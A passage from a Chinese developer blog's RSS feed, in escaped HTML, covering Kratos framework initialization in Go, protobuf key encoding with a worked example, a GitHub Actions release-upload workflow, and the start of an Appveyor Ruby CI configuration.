&lt;span class="nx">svc&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">service&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Service&lt;/span>
&lt;span class="nx">http&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Engine&lt;/span>
&lt;span class="nx">grpc&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">warden&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Server&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">NewApp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">service&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Service&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">h&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">bm&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Engine&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">g&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">warden&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Server&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">app&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">App&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">closeFunc&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">app&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">App&lt;/span>&lt;span class="p">{&lt;/span>
&lt;span class="nx">svc&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">http&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">h&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="nx">grpc&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">g&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 一个关闭context的回调
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">closeFunc&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">cancel&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">WithTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Background&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="mi">35&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Second&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">g&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Shutdown&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;grpcSrv.Shutdown error(%v)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">h&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Shutdown&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;httpSrv.Shutdown error(%v)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nf">cancel&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>到这里初始化是结束了。&lt;/p>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>&lt;code>kratos&lt;/code>的初始化流程:&lt;/p>
&lt;ul>
&lt;li>读取配置文件&lt;/li>
&lt;li>实例化Dao层&lt;/li>
&lt;li>实例化gRPC服务&lt;/li>
&lt;li>实例化gin的engine&lt;/li>
&lt;li>注册gPRC到engine&lt;/li>
&lt;li>启动engine&lt;/li>
&lt;li>启动gRPC服务端&lt;/li>
&lt;li>获得整个程序关闭的回调&lt;/li>
&lt;/ul>
&lt;p>我分得应该还是比较细的。&lt;/p>
&lt;p>后面应该还会分析&lt;code>warden&lt;/code>，它是&lt;code>Kratos&lt;/code>在&lt;code>grpc&lt;/code>原版上的一个封装版本。&lt;/p>
&lt;p>溜了溜了&amp;hellip;&lt;/p></description></item><item><title>Protubuf 原理</title><link>https://sdttttt.github.io/blog/protubuf/</link><pubDate>Mon, 30 Mar 2020 03:05:12 +0800</pubDate><guid>https://sdttttt.github.io/blog/protubuf/</guid><description>
&lt;p>protobuf的message中有很多字段,每个字段的格式为:
修饰符 字段类型 字段名 = 域号;
在序列化时,protobuf按照TLV的格式序列化每一个字段,T即Tag,也叫Key;V是该字段对应的值v
省略。
序列化后的Value是按原样保存到字符串或者文件中,Key按照一定的转换条件保存起来,序列化后的
message中字段后面的域号与字段类型来转换。转换公式如下:&lt;/p>
&lt;blockquote>
&lt;p>(field_number &amp;laquo; 3) | wire_type&lt;/p>
&lt;/blockquote>
&lt;p>wire_type与类型的对应关系表:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>wire_type&lt;/th>
&lt;th>meaning&lt;/th>
&lt;th>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0&lt;/td>
&lt;td>Vaint&lt;/td>
&lt;td>int32、int64、uint32、uint64、sint32、sint64、bool、enum&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>64-bit&lt;/td>
&lt;td>fixed、sfixed64、double&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>Length-delimi&lt;/td>
&lt;td>string、bytes、embedded、messages、packed repeated fields&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>Start group&lt;/td>
&lt;td>Groups(deprecated)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>End group&lt;/td>
&lt;td>Groups(deprecated)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>5&lt;/td>
&lt;td>32-bit&lt;/td>
&lt;td>fixed32、sfixed32、float&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;blockquote>
&lt;p>　As you can see, each field in the message definition has a unique numbered tag. These tags are used to identify your fields in the message binary format, and should not be changed once your message type is in use. Note that tags with values in the range 1 through 15 take one byte to encode. Tags in the range 16 through 2047 take two bytes. So you should reserve the tags 1 through 15 for very frequently occurring message elements. Remember to leave some room for frequently occurring elements that might be added in the future.&lt;/p>
&lt;/blockquote>
&lt;p>上面一段话是来自Google Protobuf Documents，上面有几个信息需要注意的地方：
protobuf协议使用二进制格式表示Key字段；对value而言，不同的类型采用的编码方式也不同，如果是整型，采用二进制表示；如果是字符，会直接原样写入文件或者字符串（即不编码）。由于刚开始接触protobuf协议，我也在学习中，下面我会给出一个例子，对于其他一些类型的编码方式，可以仿照这个例子自己实验一下。
&lt;strong>（这个例子主要是讲述Key的编码方式）&lt;/strong>&lt;/p>
&lt;p>上面说过，对于message中的每一个域，都对应一个域号。protobuf规定：&lt;/p>
&lt;ul>
&lt;li>如果域号在[1，15]范围内，会使用一个字节表示Key；&lt;/li>
&lt;li>如果域号大于等于16，会使用两个字节表示Key；&lt;/li>
&lt;/ul>
&lt;p>Key编码过后，该字节的第一个比特位表示之后的一个字节是否与当前这个字节有关:&lt;/p>
&lt;ul>
&lt;li>如果第一个比特位为1，表示有关，即连续两个字节都是Key的编码；&lt;/li>
&lt;li>如果第一个比特位为0，表示Key的编码只有当前一个字节，后面的字节是Length或者Value；&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>结合公式 （field_number &amp;laquo; 3）| wire_type ，如果域号大于等于16，两个字节共16位，去掉移位的3位，去掉两个字节中第一个比特位，总共16个比特位只有16-5==11个比特位用来表示Key，所以Key的域号要小于2^11== 2048&lt;/p>
&lt;/blockquote>
&lt;h2 id="protobuf-example">Protobuf Example&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-proto" data-lang="proto">&lt;span class="kd">message&lt;/span> &lt;span class="nc">Person&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="k">required&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="n">id&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="k">required&lt;/span> &lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="k">required&lt;/span> &lt;span class="n">addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span> &lt;span class="k">required&lt;/span> &lt;span class="n">test&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1000&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="err">
&lt;/span>&lt;span class="err">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="err">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>使用protoc编译后，生成两个文件：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-shell" data-lang="shell">protoc -I&lt;span class="o">=&lt;/span>. –cpp_out&lt;span class="o">=&lt;/span>. person.proto
&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>建立一个Person对象: 属性为&lt;/p>
&lt;pre>&lt;code>id = 111
name = China
addr = Asia
test = ttttt
# 打印出序列化后的结果为：
'\n\003\061\061\061\022\005China\032\004\Asia\302\005ttttt'
&lt;/code>&lt;/pre>&lt;p>‘\n’是id字段的Key，后面的\003（八进制）表示id字段的值长度为3&lt;/p>
&lt;p>&lt;strong>key的域号不超过15的序列化解析：&lt;/strong>&lt;/p>
&lt;p>因为id字段的域号为1，是小于15的，所以id字段的Key序列化要占1个字节的空间，00000001左移3位变成 00001000，因为string的wire_type值是2，所以00001000再或上2，变成00001010，就是十进制的10，即字符’\n’。下面的字段如果域号不超过15，解析同id字段。
后面连续3个’\61’（八进制）即字符’1’；
同样\022\005是name字段的key和value长度，后面是name字段的值；
\032\004是addr字段的key和value长度；&lt;/p>
&lt;p>最后，\302&amp;gt;\005是test字段的Key和Value长度；&lt;/p>
&lt;p>&lt;strong>key的域号大于15的序列化解析：&lt;/strong>&lt;/p>
&lt;p>由于CSDN编辑器不支持CSS格式，没有办法标记下面的解析内容的颜色，只有放一个图片上去了 ^_^;
下面图片中的\76就是\302后面的‘&amp;gt;’字符的八进制表示，\302与&amp;gt;共同组成最后一个字段的Key的表示（因为最后一个字段test的域号1000大于15，所以需要占两个字节表示Key）&lt;/p>
&lt;p>&lt;img src="../../protobuf_1.jpg" alt="">&lt;/p></description></item><item><title>Github Actions</title><link>https://sdttttt.github.io/blog/github_actions/</link><pubDate>Wed, 11 Mar 2020 00:50:00 +0800</pubDate><guid>https://sdttttt.github.io/blog/github_actions/</guid><description>
&lt;h2 id="github-actions-上传-releases">Github Actions 上传 Releases&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">release&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="c"># https://help.github.com/en/articles/workflow-syntax-for-github-actions#on&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">push&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">tags&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">jobs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">build&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">runs-on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ubuntu-latest&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">steps&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">uses&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">actions/checkout@v1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;find env&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">run&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="sd">
&lt;/span>&lt;span class="sd"> set | grep GITHUB_ | grep -v GITHUB_TOKEN
&lt;/span>&lt;span class="sd"> zip -r pkg.zip *.md&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">uses&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">xresloader/upload-to-github-release@v1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">env&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">GITHUB_TOKEN&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">${{ secrets.GITHUB_TOKEN }}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">with&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">file&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;*.md;*.zip&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">tags&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">draft&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">prerelease&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">overwrite&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">verbose&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Appveyor</title><link>https://sdttttt.github.io/blog/appveyor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://sdttttt.github.io/blog/appveyor/</guid><description>
&lt;p>Appveyor 也是一款线上 CICD 工具。&lt;/p>
&lt;p>Support Contexts:&lt;/p>
&lt;ul>
&lt;li>Windows (Default)&lt;/li>
&lt;li>Ubuntu&lt;/li>
&lt;li>MacOS&lt;/li>
&lt;/ul>
&lt;p>Support Languages:&lt;/p>
&lt;ul>
&lt;li>Node.js&lt;/li>
&lt;li>io.js&lt;/li>
&lt;li>Xamarin&lt;/li>
&lt;li>Python&lt;/li>
&lt;li>Ruby&lt;/li>
&lt;li>C++&lt;/li>
&lt;li>Go&lt;/li>
&lt;/ul>
&lt;h2 id="ruby">Ruby&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">1.0&lt;/span>&lt;span class="l">.{build}-{branch}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">skip_commits&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">files&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s1">&amp;#39;azure-pipelines.yml&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="s1">&amp;#39;README.md&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">install&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">set PATH=C:\Ruby26-x64\bin;%PATH%&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">bundle install&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">build&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">off&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">before_test&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">ruby -v&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">gem -v&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">bundle -v&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">test_script&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="l">rails db:migrate RAILS_ENV=test&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="appveyoryml-reference">Appveyor.yml Reference&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt"> 10
&lt;/span>&lt;span class="lnt"> 11
&lt;/span>&lt;span class="lnt"> 12
&lt;/span>&lt;span class="lnt"> 13
&lt;/span>&lt;span class="lnt"> 14
&lt;/span>&lt;span class="lnt"> 15
&lt;/span>&lt;span class="lnt"> 16
&lt;/span>&lt;span class="lnt"> 17
&lt;/span>&lt;span class="lnt"> 18
&lt;/span>&lt;span class="lnt"> 19
&lt;/span>&lt;span class="lnt"> 20
&lt;/span>&lt;span class="lnt"> 21
&lt;/span>&lt;span class="lnt"> 22
&lt;/span>&lt;span class="lnt"> 23
&lt;/span>&lt;span class="lnt"> 24
&lt;/span>&lt;span class="lnt"> 25
&lt;/span>&lt;span class="lnt"> 26
&lt;/span>&lt;span class="lnt"> 27
&lt;/span>&lt;span class="lnt"> 28
&lt;/span>&lt;span class="lnt"> 29
&lt;/span>&lt;span class="lnt"> 30
&lt;/span>&lt;span class="lnt"> 31
&lt;/span>&lt;span class="lnt"> 32
&lt;/span>&lt;span class="lnt"> 33
&lt;/span>&lt;span class="lnt"> 34
&lt;/span>&lt;span class="lnt"> 35
&lt;/span>&lt;span class="lnt"> 36
&lt;/span>&lt;span class="lnt"> 37
&lt;/span>&lt;span class="lnt"> 38
&lt;/span>&lt;span class="lnt"> 39
&lt;/span>&lt;span class="lnt"> 40
&lt;/span>&lt;span class="lnt"> 41
&lt;/span>&lt;span class="lnt"> 42
&lt;/span>&lt;span class="lnt"> 43
&lt;/span>&lt;span class="lnt"> 44
&lt;/span>&lt;span class="lnt"> 45
&lt;/span>&lt;span class="lnt"> 46
&lt;/span>&lt;span class="lnt"> 47
&lt;/span>&lt;span class="lnt"> 48
&lt;/span>&lt;span class="lnt"> 49
&lt;/span>&lt;span class="lnt"> 50
&lt;/span>&lt;span class="lnt"> 51
&lt;/span>&lt;span class="lnt"> 52
&lt;/span>&lt;span class="lnt"> 53
&lt;/span>&lt;span class="lnt"> 54
&lt;/span>&lt;span class="lnt"> 55
&lt;/span>&lt;span class="lnt"> 56
&lt;/span>&lt;span class="lnt"> 57
&lt;/span>&lt;span class="lnt"> 58
&lt;/span>&lt;span class="lnt"> 59
&lt;/span>&lt;span class="lnt"> 60
&lt;/span>&lt;span class="lnt"> 61
&lt;/span>&lt;span class="lnt"> 62
&lt;/span>&lt;span class="lnt"> 63
&lt;/span>&lt;span class="lnt"> 64
&lt;/span>&lt;span class="lnt"> 65
&lt;/span>&lt;span class="lnt"> 66
&lt;/span>&lt;span class="lnt"> 67
&lt;/span>&lt;span class="lnt"> 68
&lt;/span>&lt;span class="lnt"> 69
&lt;/span>&lt;span class="lnt"> 70
&lt;/span>&lt;span class="lnt"> 71
&lt;/span>&lt;span class="lnt"> 72
&lt;/span>&lt;span class="lnt"> 73
&lt;/span>&lt;span class="lnt"> 74
&lt;/span>&lt;span class="lnt"> 75
&lt;/span>&lt;span class="lnt"> 76
&lt;/span>&lt;span class="lnt"> 77
&lt;/span>&lt;span class="lnt"> 78
&lt;/span>&lt;span class="lnt"> 79
&lt;/span>&lt;span class="lnt"> 80
&lt;/span>&lt;span class="lnt"> 81
&lt;/span>&lt;span class="lnt"> 82
&lt;/span>&lt;span class="lnt"> 83
&lt;/span>&lt;span class="lnt"> 84
&lt;/span>&lt;span class="lnt"> 85
&lt;/span>&lt;span class="lnt"> 86
&lt;/span>&lt;span class="lnt"> 87
&lt;/span>&lt;span class="lnt"> 88
&lt;/span>&lt;span class="lnt"> 89
&lt;/span>&lt;span class="lnt"> 90
&lt;/span>&lt;span class="lnt"> 91
&lt;/span>&lt;span class="lnt"> 92
&lt;/span>&lt;span class="lnt"> 93
&lt;/span>&lt;span class="lnt"> 94
&lt;/span>&lt;span class="lnt"> 95
&lt;/span>&lt;span class="lnt"> 96
&lt;/span>&lt;span class="lnt"> 97
&lt;/span>&lt;span class="lnt"> 98
&lt;/span>&lt;span class="lnt"> 99
&lt;/span>&lt;span class="lnt">100
&lt;/span>&lt;span class="lnt">101
&lt;/span>&lt;span class="lnt">102
&lt;/span>&lt;span class="lnt">103
&lt;/span>&lt;span class="lnt">104
&lt;/span>&lt;span class="lnt">105
&lt;/span>&lt;span class="lnt">106
&lt;/span>&lt;span class="lnt">107
&lt;/span>&lt;span class="lnt">108
&lt;/span>&lt;span class="lnt">109
&lt;/span>&lt;span class="lnt">110
&lt;/span>&lt;span class="lnt">111
&lt;/span>&lt;span class="lnt">112
&lt;/span>&lt;span class="lnt">113
&lt;/span>&lt;span class="lnt">114
&lt;/span>&lt;span class="lnt">115
&lt;/span>&lt;span class="lnt">116
